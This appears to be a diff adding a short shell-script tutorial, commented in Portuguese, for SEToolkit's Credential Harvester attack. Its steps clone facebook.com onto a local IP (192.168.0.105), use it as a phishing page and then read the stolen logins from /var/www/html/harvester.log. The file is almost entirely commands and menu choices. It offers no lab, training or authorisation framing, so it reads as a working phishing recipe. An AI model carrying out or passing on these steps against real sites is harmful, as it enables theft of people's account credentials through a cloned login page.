@@ -1,0 +1,28 @@
+# 1. Acessando o SEToolkit
+sudo setoolkit
+
+# 2. Selecionando as Opções no SEToolkit
+# Após iniciar o SEToolkit, siga as instruções na interface e selecione:
+# 1. Social-Engineering Attacks
+# 2. Website Attack Vectors
+# 3. Credential Harvester Attack Method
+# 4. Site Cloner
+
+# 3. Obtendo o Endereço IP da Máquina
+ifconfig
+# ou, para versões mais recentes do Linux
+ip a
+
+# Anote o endereço IP exibido (exemplo: 192.168.0.105)
+
+# 4. Clonando o Site Alvo
+# No SEToolkit, forneça o endereço IP da máquina e o URL do site a ser clonado:
+# Enter the IP address for the POST back in Harvester/Tabnabbing: 192.168.0.105
+# Enter the URL to clone: http://www.facebook.com
+
+# 5. Captura de Credenciais
+# As credenciais capturadas serão armazenadas no seguinte arquivo:
+# /var/www/html/harvester.log
+
+# Para visualizar as credenciais capturadas, use:
+cat /var/www/html/harvester.log
